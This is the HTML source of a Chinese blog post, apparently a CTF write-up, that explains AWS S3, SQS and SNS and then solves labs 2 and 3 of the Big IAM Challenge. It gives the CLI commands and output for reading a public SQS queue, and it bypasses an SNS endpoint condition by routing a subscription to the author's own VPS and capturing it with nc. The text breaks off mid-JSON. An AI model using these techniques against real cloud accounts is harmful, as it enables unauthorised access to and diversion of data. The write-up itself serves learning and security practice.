@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="AWS上的服务：s3对象存储服务  用途：存储文件（如文档、图片、视频等），类似于云硬盘。 典型操作： aws s3 ls（列出存储桶） aws s3 cp（上传&#x2F;下载文件） aws s3 rm（删除文件）   权限策略示例：  12345678&#123;    &quot;Version&quot;: &quot;2012-10-17&quot;,    &quot;Statemen">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AWS-labs">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/AWS-labs/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="AWS上的服务：s3对象存储服务  用途：存储文件（如文档、图片、视频等），类似于云硬盘。 典型操作： aws s3 ls（列出存储桶） aws s3 cp（上传&#x2F;下载文件） aws s3 rm（删除文件）   权限策略示例：  12345678&#123;    &quot;Version&quot;: &quot;2012-10-17&quot;,    &quot;Statemen">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-05-31T06:41:10.000Z">
+<meta property="article:modified_time" content="2025-06-01T10:16:13.782Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="云">
+<meta property="article:tag" content="学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>AWS-labs</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/CMctf-web-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/d3ctf-web%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/AWS-labs/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&text=AWS-labs"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&title=AWS-labs"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&is_video=false&description=AWS-labs"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=AWS-labs&body=Check out this article: https://hexo.sheep-sys-sudo.top/AWS-labs/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&title=AWS-labs"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&title=AWS-labs"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&title=AWS-labs"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&title=AWS-labs"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/AWS-labs/&name=AWS-labs&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/AWS-labs/&t=AWS-labs"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AWS%E4%B8%8A%E7%9A%84%E6%9C%8D%E5%8A%A1%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">AWS上的服务：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#s3"><span class="toc-number">1.1.</span> <span class="toc-text">s3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqs"><span class="toc-number">1.2.</span> <span class="toc-text">sqs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SNS"><span class="toc-number">1.3.</span> <span class="toc-text">SNS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E4%B8%8E%E5%8A%9F%E8%83%BD"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">启动的服务与功能</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#The-big-IAM-CTF"><span class="toc-number">2.</span> <span class="toc-text">The big IAM CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#lab-2"><span class="toc-number">2.1.</span> <span class="toc-text">lab-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lab-3"><span class="toc-number">2.2.</span> <span class="toc-text">lab-3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E4%B8%8E%E5%8A%9F%E8%83%BD-1"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">启动的服务与功能</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lab-4"><span class="toc-number">2.3.</span> <span class="toc-text">lab-4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lab-5"><span class="toc-number">2.4.</span> <span class="toc-text">lab-5</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        AWS-labs
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-31T06:41:10.000Z" class="dt-published" itemprop="datePublished">2025-05-31</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/aws/">aws</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E4%BA%91/" rel="tag">云</a>, <a class="p-category" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="AWS上的服务："><a href="#AWS上的服务：" class="headerlink" title="AWS上的服务："></a>AWS上的服务：</h1><h2 id="s3"><a href="#s3" class="headerlink" title="s3"></a>s3</h2><p><strong>对象存储服务</strong></p>
+<ul>
+<li><strong>用途</strong>：存储文件（如文档、图片、视频等），类似于云硬盘。</li>
+<li><strong>典型操作</strong>：<ul>
+<li><code>aws s3 ls</code>（列出存储桶）</li>
+<li><code>aws s3 cp</code>（上传&#x2F;下载文件）</li>
+<li><code>aws s3 rm</code>（删除文件）</li>
+</ul>
+</li>
+<li><strong>权限策略示例</strong>：</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;s3:ListBucket&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::your-bucket-name&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="sqs"><a href="#sqs" class="headerlink" title="sqs"></a>sqs</h2><p><strong>队列查询服务</strong></p>
+<p><strong>用途</strong>：用于应用程序之间的异步消息传递（如任务队列、事件通知）。</p>
+<p><strong>典型操作</strong>：</p>
+<ul>
+<li><code>aws sqs send-message</code>（发送消息）</li>
+<li><code>aws sqs receive-message</code>（接收消息）</li>
+<li><code>aws sqs delete-message</code>（删除消息）</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;sqs:SendMessage&quot;</span><span class="punctuation">,</span> <span class="string">&quot;sqs:ReceiveMessage&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="SNS"><a href="#SNS" class="headerlink" title="SNS"></a>SNS</h2><h4 id="启动的服务与功能"><a href="#启动的服务与功能" class="headerlink" title="启动的服务与功能"></a><strong>启动的服务与功能</strong></h4><ul>
+<li><p><strong>服务</strong>：<strong>Amazon SNS</strong>（Simple Notification Service），用于发布&#x2F;订阅消息（如邮件、短信、HTTP通知等）。</p>
+</li>
+<li><p><strong>作用</strong>：</p>
+<ul>
+<li><p>允许任何 AWS 账户（<code>Principal: &quot;*&quot;</code>）<strong>订阅</strong>指定的 SNS 主题（<code>TBICWizPushNotifications</code>）。</p>
+</li>
+<li><p>但仅限端点（Endpoint）为 <code>*@tbic.wiz.io</code> 的订阅请求（例如邮件地址 <code>user@tbic.wiz.io</code>）。</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>该策略存在如下风险：</p>
+<ol>
+<li>全局访问权限：该策略中指定了允许任何AWS用户（”*”）执行SNS订阅操作。这意味着任何具有有效的AWS凭证的用户都可以订阅该SNS主题。如果此策略不是有意为特定用户或实体设计的，可能存在风险，因为未经授权的用户可以执行订阅操作。</li>
+<li>通配符条件：该策略中的条件指定订阅者的Endpoint必须以”*@tbic.wiz.io”结尾。然而，通配符条件可能过于宽松，允许任何以该域名结尾的Endpoint进行订阅，包括未经授权的Endpoint。这可能导致未经授权的实体订阅主题并接收敏感信息或滥用SNS服务。</li>
+<li>潜在的信息泄露：由于该策略允许任何人订阅主题，如果主题包含敏感信息或重要通知，可能会导致信息泄露的风险。攻击者可以订阅主题并接收敏感信息，甚至利用该信息进行其他恶意行为。</li>
+</ol>
+<h1 id="The-big-IAM-CTF"><a href="#The-big-IAM-CTF" class="headerlink" title="The big IAM CTF"></a>The big IAM CTF</h1><p><code>网址：https://bigiamchallenge.com</code></p>
+<p>该网址会自动帮助我们连接上AWS</p>
+<h2 id="lab-2"><a href="#lab-2" class="headerlink" title="lab-2"></a>lab-2</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;sqs:SendMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;sqs:ReceiveMessage&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到属于sqs服务</p>
+<p>1、该策略将操作权限授予了所有用户（”*”），意味着任何具有该策略的用户或角色都可以发送和接收消息。</p>
+<p>2、该策略没有限制允许访问的用户、角色或其他条件。它允许所有用户执行SendMessage和ReceiveMessage操作。</p>
+<p>因此，我们 <code>aws sqs receive-message --queue-url https://us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2</code></p>
+<p>得到</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Messages&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;MessageId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5c1b6bfe-d444-4c92-90d5-b047977fea14&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ReceiptHandle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AQEBy/pCcFMnsGgfJ4jTXVXcCnWZ1VBzm+QLG6OShbxYI5hZjeFm6ggdYpYxj8660PrKmy0di7O9USiTTBct3TMKqSxBY5Ke3nzuydiE1FA2JLLH2</span></span><br><span class="line"><span class="string">4fNganKgrgZNIn5+cbHAJ332+J00m1LwNwL6WoyXCBSzhXvukbjsgBm7SMTP5XB+chhE4gTmx/EvnaC3HKqVWwBzXEGU5cDPfGFMWXc9cnZ9kuY8nC1i02uflzgTcj9DxbgXXnoR6z4ceis</span></span><br><span class="line"><span class="string">cCmx0hwfBXJhWlKU/NKBFtGk+oZkWPHunWaGED7oScV3L09HsFPvnSVTb5ytSBvDbbO/1O2xXHfUqXhn43Vz0p2fecufgTb2rwSQRRzrrtcwOgHURfqgJs/RtmV0FVRoO8nlxRfIuKCcTwX</span></span><br><span class="line"><span class="string">ARL/m3E8hB1Gk90fTj4GiFvbwtTpDFJA=&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;MD5OfBody&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4cb94e2bb71dbd5de6372f7eaea5c3fd&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Body&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;\&quot;URL\&quot;: \&quot;https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\&quot;, \&quot;User-Agent\&quot;: \&quot;Lynx/2.5329.32</span></span><br><span class="line"><span class="string">58dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\&quot;, \&quot;IsAdmin\&quot;: true&#125;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>打开这个文件拿到flag</p>
+<p>{wiz:you-are-at-the-front-of-the-queue}</p>
+<h2 id="lab-3"><a href="#lab-3" class="headerlink" title="lab-3"></a>lab-3</h2><p>如下：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2008-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Statement1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Statement1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SNS:Subscribe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;sns:Endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*@tbic.wiz.io&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>注意和上一题有不一样，关键在于出现了一个SNS服务，丢给deepseek看一下</p>
+<h4 id="启动的服务与功能-1"><a href="#启动的服务与功能-1" class="headerlink" title="启动的服务与功能"></a><strong>启动的服务与功能</strong></h4><ul>
+<li><strong>服务</strong>：<strong>Amazon SNS</strong>（Simple Notification Service），用于发布&#x2F;订阅消息（如邮件、短信、HTTP通知等）。</li>
+<li><strong>作用</strong>：<ul>
+<li>允许任何 AWS 账户（<code>Principal: &quot;*&quot;</code>）<strong>订阅</strong>指定的 SNS 主题（<code>TBICWizPushNotifications</code>）。</li>
+<li>但仅限端点（Endpoint）为 <code>*@tbic.wiz.io</code> 的订阅请求（例如邮件地址 <code>user@tbic.wiz.io</code>）</li>
+</ul>
+</li>
+</ul>
+<p>那么</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws sns subscribe \</span><br><span class="line">    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \//接受到的服务</span><br><span class="line">    --protocol email \//以电子邮件的方式</span><br><span class="line">    --notification-endpoint admin@tbic.wiz.io//接受的端点，邮箱</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>回显</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;SubscriptionArn&quot;: &quot;pending confirmation&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>此时，等待你去点击确定连接</p>
+<p>应该怎么做呢</p>
+<p>我们可以控制<a href="mailto:&#x61;&#x64;&#109;&#x69;&#x6e;&#64;&#x74;&#98;&#x69;&#x63;&#46;&#119;&#105;&#122;&#x2e;&#105;&#x6f;">&#x61;&#x64;&#109;&#x69;&#x6e;&#64;&#x74;&#98;&#x69;&#x63;&#46;&#119;&#105;&#122;&#x2e;&#105;&#x6f;</a>改为<a target="_blank" rel="noopener" href="http://12121221212121@tbic.wiz.io/">http://12121221212121@tbic.wiz.io</a></p>
+<p>发送到我们的vps上</p>
+<p>使用http协议进行代理监听的方式获取订阅消息</p>
+<p>注意将protocol改为http(注意改http之后中间用&#x2F;连接)</p>
+<p>nc监听得到</p>
+<p>Connection received on 15.221.160.24 36215<br>POST &#x2F;@tbic.wiz.io HTTP&#x2F;1.1<br>x-amz-sns-message-type: SubscriptionConfirmation<br>x-amz-sns-message-id: 6be54276-2da7-40fb-8258-ca44518450f5<br>x-amz-sns-topic-arn: arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications<br>Content-Type: text&#x2F;plain; charset&#x3D;UTF-8<br>Content-Length: 1623<br>Connection: Keep-Alive<br>User-Agent: Amazon Simple Notification Service Agent<br>Accept-Encoding: gzip,deflate</p>
+<p>{<br>  “Type” : “SubscriptionConfirmation”,<br>  “MessageId” : “6be54276-2da7-40fb-8258-ca44518450f5”,<br>  “Token” : “2336412f37fb687f5d51e6e2425a8a5875c3b63688278ec557940a84d4fc6d0f6065a4feb7686396be5ca68ed76ee5399e6b1b33c58930f52d554696d9d9dd86b6faec7585e3bf4780951800dd877c50cc7c79f5c4dd73eb10b453386aa22b5518c2b700fa5983eada750411ae29f2b2bd74cfad1685f29ec6e62489cd7ebf03”,<br>  “TopicArn” : “arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications”,<br>  “Message” : “You have chosen to subscribe to the topic arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications.\nTo confirm the subscription, visit the SubscribeURL included in this message.”,<br>  “SubscribeURL” : “<a target="_blank" rel="noopener" href="https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&Token=2336412f37fb687f5d51e6e2425a8a5875c3b63688278ec557940a84d4fc6d0f6065a4feb7686396be5ca68ed76ee5399e6b1b33c58930f52d554696d9d9dd86b6faec7585e3bf4780951800dd877c50cc7c79f5c4dd73eb10b453386aa22b5518c2b700fa5983eada750411ae29f2b2bd74cfad1685f29ec6e62489cd7ebf03">https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&amp;TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&amp;Token=2336412f37fb687f5d51e6e2425a8a5875c3b63688278ec557940a84d4fc6d0f6065a4feb7686396be5ca68ed76ee5399e6b1b33c58930f52d554696d9d9dd86b6faec7585e3bf4780951800dd877c50cc7c79f5c4dd73eb10b453386aa22b5518c2b700fa5983eada750411ae29f2b2bd74cfad1685f29ec6e62489cd7ebf03</a>“,<br>  “Timestamp” : “2025-05-31T07:56:42.369Z”,<br>  “SignatureVersion” : “1”,<br>  “Signature” : 